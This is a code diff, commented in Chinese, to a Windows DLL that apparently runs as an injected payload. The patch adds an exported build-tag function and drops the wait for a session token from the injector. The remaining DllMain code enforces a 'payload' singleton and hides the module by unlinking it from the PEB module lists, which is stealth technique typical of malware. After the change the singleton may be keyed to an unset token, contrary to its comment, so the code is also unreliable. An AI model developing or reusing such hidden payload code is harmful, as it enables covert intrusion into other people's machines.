@@ -5,6 +5,9 @@
 /* 共享内存布局与命名常量：唯一来源见 xxipc.h */
 #include "xxipc.h"
 
+/* ---- 构建标记导出：注入方/加载方用它校验"拿到的确实是同一版二进制" ---- */
+__declspec(dllexport) const char * WINAPI XxBuildTag(void) { return "v7"; }
+
 static ULONGLONG g_dwNameToken = 0;       /* 会话随机名 token：只由 XxSetNames 送进来 */
 
 /* 远程导出：接收会话随机名（方案 A；参数块由注入方清零并释放） */
@@ -92,7 +95,6 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {    UNREFER
         /* 进程内单例：模块隐藏后注入方看不到我们，会反复注入；
            已有实例时直接让加载失败，避免同一进程里塞进多份载荷。
            名字带会话 token，对手没法预先抢占这个单例把载荷挡在门外。 */
-        XXWaitToken(&g_dwNameToken, 300);   /* 等注入方送名字（避免同名/异名错配） */
         if (!XXModuleSingleton(L"payload", g_dwNameToken)) return FALSE;
 
         XXHideSelfFromPeb(hinst);          /* 从 PEB 三条模块链表里摘除自己 */
@@ -101,3 +103,4 @@ BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {    UNREFER
     }
     return TRUE;
 }
+
